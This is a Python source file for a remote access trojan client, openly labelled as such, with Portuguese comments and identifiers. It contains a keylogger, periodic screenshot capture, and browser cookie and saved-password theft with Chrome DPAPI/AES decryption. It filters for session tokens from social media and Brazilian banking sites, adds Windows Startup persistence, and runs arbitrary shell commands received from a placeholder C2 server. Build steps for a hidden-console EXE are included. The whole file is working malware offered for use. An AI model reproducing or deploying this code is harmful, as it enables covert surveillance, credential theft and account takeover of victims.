# ==================== rat_client.py ====================
"""
C2 RAT Client — Telemetry + Keylogger + Cookie Logger + Password Stealer + Screenshot
Arquivos separados: keylogs/, cookies/, screenshots/

Python 3.10+
Requirements:
    pip install requests psutil pyautogui pillow pynput pywin32 pycryptodome

Build to EXE (Windows):
    pip install pyinstaller
    pyinstaller --onefile --noconsole --name client rat_client.py

Configuration:
    Edit SERVER_URL below with your C2 server address
"""

import requests
import socket
import getpass
import psutil
import time
import subprocess
import json
import os
import sys
import re
import base64
from datetime import datetime
from pathlib import Path
from pynput import keyboard
import threading
import sqlite3
import shutil
import pyautogui
from PIL import Image
import io

# ============================================================
# CONFIGURATION
# ============================================================

# CHANGE THIS to your C2 server address
SERVER_URL = "http://YOUR_SERVER_IP:8080"

CLIENT_ID = f"{socket.gethostname()}_{getpass.getuser()}"
PERSISTENCE = False  # Set to True to add to Windows startup
INTERVAL_TELEMETRY = 30
INTERVAL_ARQUIVOS = 300
INTERVAL_SCREENSHOT = 120
INTERVAL_KEYLOG = 60
INTERVAL_COOKIES = 300

# ============================================================
# FILE DIRECTORIES
# ============================================================

BASE_DIR = Path.cwd()
KEYLOG_DIR = BASE_DIR / "keylogs"
COOKIES_DIR = BASE_DIR / "cookies"
SCREENSHOTS_DIR = BASE_DIR / "screenshots"
DEBUG_LOG = BASE_DIR / "client_debug.log"
ERROR_LOG = BASE_DIR / "error.log"

KEYLOG_DIR.mkdir(exist_ok=True)
COOKIES_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)

def log_debug(msg):
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {msg}\n")
    except: pass

def log_error(msg):
    try:
        with open(ERROR_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {msg}\n")
    except: pass

# ============================================================
# KEYLOGGER
# ============================================================

keylog_accumulated = ""
keylog_lock = threading.Lock()
keylogger = None
keylogger_running = False

def on_press(key):
    global keylog_accumulated
    try: keylog_accumulated += key.char
    except AttributeError:
        if key == keyboard.Key.space: keylog_accumulated += ' '
        elif key == keyboard.Key.enter: keylog_accumulated += '\n'
        elif key == keyboard.Key.tab: keylog_accumulated += '\t'
        elif key == keyboard.Key.backspace: keylog_accumulated += '[BS]'
        elif key == keyboard.Key.shift: keylog_accumulated += '[SHIFT]'
        elif key == keyboard.Key.ctrl: keylog_accumulated += '[CTRL]'
        elif key == keyboard.Key.alt: keylog_accumulated += '[ALT]'
        elif key == keyboard.Key.esc: keylog_accumulated += '[ESC]'

def start_keylogger():
    global keylogger, keylogger_running
    try:
        keylogger = keyboard.Listener(on_press=on_press)
        keylogger.start()
        keylogger_running = True
        log_debug("keylogger: INICIADO")
    except Exception as e:
        log_debug(f"keylogger: erro - {str(e)}")
        keylogger_running = False

def salvar_keylog_arquivo():
    global keylog_accumulated
    with keylog_lock:
        keys = keylog_accumulated
        keylog_accumulated = ""
    if not keys.strip(): return
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        arquivo = KEYLOG_DIR / f"keylog_{timestamp}.txt"
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write(f"=== KEYLOG ===\nClient: {CLIENT_ID}\nData: {datetime.now().isoformat()}\n=== TECLAS ===\n\n{keys}")
        log_debug(f"keylog salvo: {arquivo}")
    except Exception as e:
        log_debug(f"salvar_keylog_arquivo: erro - {str(e)}")

# ============================================================
# SCREENSHOT
# ============================================================

def tirar_e_salvar_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        arquivo = SCREENSHOTS_DIR / f"screenshot_{timestamp}.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(str(arquivo), "PNG")
        log_debug(f"screenshot salvo: {arquivo}")
        return str(arquivo)
    except Exception as e:
        log_debug(f"tirar_screenshot: erro - {str(e)}")
        return None

# ============================================================
# DPAPI DECRYPTION (Chrome 80+)
# ============================================================

def decrypt_dpapi(encrypted_data):
    """Decrypts DPAPI encrypted data (cookies, passwords)"""
    if not encrypted_data:
        return ""
    try:
        import win32crypt
        decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)
        if decrypted:
            return decrypted.decode("utf-8", errors="ignore")
    except Exception as e:
        log_debug(f"decrypt_dpapi win32crypt: erro - {str(e)}")
    try:
        from Crypto.Cipher import AES
        import win32crypt
        local_state_path = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Local State"
        if local_state_path.exists():
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
            if master_key and len(encrypted_data) >= 28:
                iv = encrypted_data[:12]
                ciphertext = encrypted_data[12:-16]
                tag = encrypted_data[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode("utf-8", errors="ignore")
    except Exception as e:
        log_debug(f"decrypt_dpapi AES: erro - {str(e)}")
    return "[encrypted]"

# ============================================================
# COOKIE LOGGER
# ============================================================

def get_browser_cookies():
    """Extracts cookies from Chrome, Edge, Firefox"""
    cookies_data = {}
    browsers = {
        "chrome": Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default",
        "edge": Path.home() / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default",
        "firefox": Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
    }
    for name, path in [("chrome", browsers["chrome"]), ("edge", browsers["edge"])]:
        try:
            cookie_db = path / "Network" / "Cookies"
            if not cookie_db.exists(): cookie_db = path / "Cookies"
            if cookie_db.exists():
                temp_db = Path(os.environ["TEMP"]) / f"cookies_{name}.db"
                shutil.copy2(cookie_db, temp_db)
                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                cookies = []
                for row in cursor.fetchall():
                    host, name, value, encrypted = row
                    if value: cookies.append({"host": host, "name": name, "value": value})
                    elif encrypted:
                        decrypted = decrypt_dpapi(encrypted)
                        cookies.append({"host": host, "name": name, "value": decrypted})
                conn.close()
                temp_db.unlink(missing_ok=True)
                cookies_data[name] = cookies
                log_debug(f"cookie_logger: {name} - {len(cookies)} cookies")
        except Exception as e:
            log_debug(f"cookie_logger {name}: erro - {str(e)}")
    try:
        firefox_profiles = browsers["firefox"]
        if firefox_profiles.exists():
            for profile in firefox_profiles.iterdir():
                if profile.is_dir():
                    cookie_db = profile / "cookies.sqlite"
                    if cookie_db.exists():
                        temp_db = Path(os.environ["TEMP"]) / "cookies_firefox.db"
                        shutil.copy2(cookie_db, temp_db)
                        conn = sqlite3.connect(str(temp_db))
                        cursor = conn.cursor()
                        cursor.execute("SELECT host, name, value FROM moz_cookies")
                        cookies = [{"host": row[0], "name": row[1], "value": row[2]} for row in cursor.fetchall()]
                        conn.close()
                        temp_db.unlink(missing_ok=True)
                        cookies_data["firefox"] = cookies
                        log_debug(f"cookie_logger: firefox - {len(cookies)} cookies")
                        break
    except Exception as e:
        log_debug(f"cookie_logger firefox: erro - {str(e)}")
    return cookies_data

def filtrar_cookies_importantes(cookies_data):
    """Filters important cookies (sessions, tokens, auth)"""
    dominios_importantes = ["facebook.com", "instagram.com", "twitter.com", "google.com", "youtube.com", "microsoft.com", "live.com", "outlook.com", "hotmail.com", "github.com", "discord.com", "tiktok.com", "reddit.com", "amazon.com", "mercadolivre.com", "nubank", "itau", "bradesco", "santander", "bb.com.br"]
    nomes_importantes = ["session", "sess", "token", "auth", "login", "access_token", "refresh_token", "c_user", "datr", "NID", "SID", "HSID", "kmsi", "ESTSAUTPRT", "auth-token", "__cfruid"]
    filtrados = {}
    for browser, cookies in cookies_data.items():
        cookies_filtrados = []
        for cookie in cookies:
            host = cookie.get("host", "").lower()
            name = cookie.get("name", "").lower()
            value = cookie.get("value", "")
            dominio_importante = any(d in host for d in dominios_importantes)
            nome_importante = any(n in name for n in nomes_importantes)
            parece_token = len(value) > 50 and any(x in name for x in ["token", "sess", "auth", "sid"])
            if dominio_importante or nome_importante or parece_token:
                cookies_filtrados.append({"host": host, "name": name, "value": value, "prioridade": "alta" if dominio_importante and nome_importante else "media"})
        if cookies_filtrados: filtrados[browser] = cookies_filtrados[:100]
    return filtrados

def coletar_e_salvar_cookies():
    """Collects and saves cookies to file"""
    try:
        cookies_raw = get_browser_cookies()
        cookies_filtrados = filtrar_cookies_importantes(cookies_raw)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        arquivo = COOKIES_DIR / f"cookies_{timestamp}.json"
        dados = {"client_id": CLIENT_ID, "data_coleta": datetime.now().isoformat(), "total_cookies": sum(len(v) for v in cookies_filtrados.values()), "cookies_por_navegador": cookies_filtrados}
        with open(arquivo, "w", encoding="utf-8") as f:
            json.dump(dados, f, indent=2, ensure_ascii=False)
        log_debug(f"cookies salvos: {arquivo} ({dados['total_cookies']} cookies)")
    except Exception as e:
        log_debug(f"coletar_e_salvar_cookies: ERRO - {str(e)}")

# ============================================================
# PASSWORD STEALER
# ============================================================

def get_browser_passwords():
    """Extracts saved passwords from browsers"""
    passwords_data = {}
    browsers = {
        "chrome": Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default",
        "edge": Path.home() / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default",
        "firefox": Path.home() / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles"
    }
    for name, path in [("chrome", browsers["chrome"]), ("edge", browsers["edge"])]:
        try:
            login_db = path / "Login Data"
            if login_db.exists():
                log_debug(f"password_logger: {name} - DB encontrado")
                temp_db = Path(os.environ["TEMP"]) / f"login_{name}.db"
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                logins = []
                decrypted_count = 0
                total = 0
                for row in cursor.fetchall():
                    url, username, password = row
                    total += 1
                    decrypted_password = ""
                    if password:
                        decrypted_password = decrypt_dpapi(password)
                        if decrypted_password != "[encrypted]":
                            decrypted_count += 1
                    if username or decrypted_password:
                        logins.append({"url": url, "username": username, "password": decrypted_password})
                conn.close()
                temp_db.unlink(missing_ok=True)
                passwords_data[name] = logins
                log_debug(f"password_logger: {name} - {total} total, {decrypted_count} decryptados")
        except Exception as e:
            log_debug(f"password_logger {name}: ERRO - {str(e)}")
    try:
        firefox_profiles = browsers["firefox"]
        if firefox_profiles.exists():
            for profile in firefox_profiles.iterdir():
                if profile.is_dir():
                    logins_json = profile / "logins.json"
                    if logins_json.exists():
                        log_debug(f"password_logger: firefox - logins.json encontrado")
                        try:
                            with open(logins_json, "r", encoding="utf-8") as f:
                                data = json.load(f)
                            logins = [{"url": login.get("hostname", ""), "username": login.get("encryptedUsername", "[encrypted]"), "password": login.get("encryptedPassword", "[encrypted]")} for login in data.get("logins", [])]
                            passwords_data["firefox"] = logins
                            log_debug(f"password_logger: firefox - {len(logins)} logins")
                        except Exception as e:
                            log_debug(f"password_logger firefox: erro - {str(e)}")
                        break
    except Exception as e:
        log_debug(f"password_logger firefox: ERRO - {str(e)}")
    return passwords_data

def salvar_senhas_arquivo():
    """Saves extracted passwords to file"""
    try:
        senhas_raw = get_browser_passwords()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        arquivo = COOKIES_DIR / f"senhas_navegadores_{timestamp}.json"
        with open(arquivo, "w", encoding="utf-8") as f:
            json.dump({"client_id": CLIENT_ID, "data_coleta": datetime.now().isoformat(), "senhas_por_navegador": senhas_raw}, f, indent=2, ensure_ascii=False)
        log_debug(f"senhas salvas: {arquivo}")
    except Exception as e:
        log_debug(f"salvar_senhas_arquivo: ERRO - {str(e)}")

# ============================================================
# PERSISTENCE
# ============================================================

def add_to_startup():
    """Adds client to Windows startup"""
    if sys.platform != "win32": return
    startup_folder = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    startup_file = startup_folder / "client.exe"
    if not startup_file.exists():
        try:
            import shutil
            shutil.copy2(sys.executable, startup_file)
            log_debug("persistencia adicionada")
        except Exception as e:
            log_debug(f"erro persistencia: {str(e)}")

# ============================================================
# NETWORK COMMUNICATION
# ============================================================

def send_log(message):
    """Sends log message to C2 server"""
    try:
        r = requests.post(f"{SERVER_URL}/log", json={"client_id": CLIENT_ID, "message": message}, timeout=5)
    except Exception as e:
        log_debug(f"send_log erro: {str(e)}")

def register():
    """Registers client with C2 server"""
    try:
        r = requests.post(f"{SERVER_URL}/register", json={"client_id": CLIENT_ID}, timeout=5)
        if r.status_code == 200: log_debug("cliente registrado")
    except Exception as e:
        log_debug(f"register erro: {str(e)}")

def heartbeat():
    """Sends heartbeat to C2 server"""
    try: requests.post(f"{SERVER_URL}/heartbeat", json={"client_id": CLIENT_ID}, timeout=5)
    except: pass

def poll_tasks():
    """Polls C2 server for pending tasks"""
    try:
        r = requests.get(f"{SERVER_URL}/tasks/{CLIENT_ID}", timeout=5)
        return r.json().get("task")
    except: return None

def submit_result(task_id, status, output="", error=""):
    """Submits task result to C2 server"""
    try: requests.post(f"{SERVER_URL}/result", json={"task_id": task_id, "client_id": CLIENT_ID, "status": status, "output": output, "error": error}, timeout=5)
    except: pass

# ============================================================
# TASK EXECUTION
# ============================================================

def executar_tarefa(task):
    """Executes C2 task"""
    try:
        cmd = task.get("command", "")
        args = task.get("args", "")
        if cmd == "shell":
            result = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
            return "success", result.stdout + result.stderr, ""
        elif cmd == "screenshot":
            arquivo = tirar_e_salvar_screenshot()
            return "success", f"Screenshot: {arquivo}", "" if arquivo else "erro"
        elif cmd == "telemetria":
            return "success", json.dumps({"hostname": socket.gethostname(), "usuario": getpass.getuser(), "ip": socket.gethostbyname(socket.gethostname()), "cpu": psutil.cpu_percent(), "ram": round(psutil.virtual_memory().used / (1024**3), 2)}), ""
        elif cmd == "keylog":
            with keylog_lock: keys = keylog_accumulated
            return "success", keys[:2000] if keys else "nenhuma tecla", ""
        elif cmd == "cookies":
            coletar_e_salvar_cookies()
            salvar_senhas_arquivo()
            return "success", "cookies + senhas coletados", ""
        else: return "error", "", f"comando desconhecido: {cmd}"
    except Exception as e:
        return "error", "", str(e)

# ============================================================
# MAIN LOOP
# ============================================================

def main():
    log_debug("=" * 50)
    log_debug("CLIENT INICIANDO")
    log_debug(f"KEYLOG_DIR: {KEYLOG_DIR}")
    log_debug(f"COOKIES_DIR: {COOKIES_DIR}")
    log_debug(f"SCREENSHOTS_DIR: {SCREENSHOTS_DIR}")
    log_debug("=" * 50)
    start_keylogger()
    if PERSISTENCE: add_to_startup()
    register()
    send_log("RAT iniciado")
    last_keylog = 0
    last_cookies = 0
    last_screenshot = 0
    while True:
        try:
            heartbeat()
            if time.time() - last_keylog >= INTERVAL_KEYLOG:
                salvar_keylog_arquivo()
                last_keylog = time.time()
            if time.time() - last_cookies >= INTERVAL_COOKIES:
                coletar_e_salvar_cookies()
                salvar_senhas_arquivo()
                last_cookies = time.time()
            if time.time() - last_screenshot >= INTERVAL_SCREENSHOT:
                tirar_e_salvar_screenshot()
                last_screenshot = time.time()
            task = poll_tasks()
            if task:
                status, output, error = executar_tarefa(task)
                submit_result(task["task_id"], status, output, error)
            time.sleep(INTERVAL_TELEMETRY)
        except Exception as e:
            log_debug(f"erro_loop: {str(e)}")
            time.sleep(10)

if __name__ == "__main__":
    main()
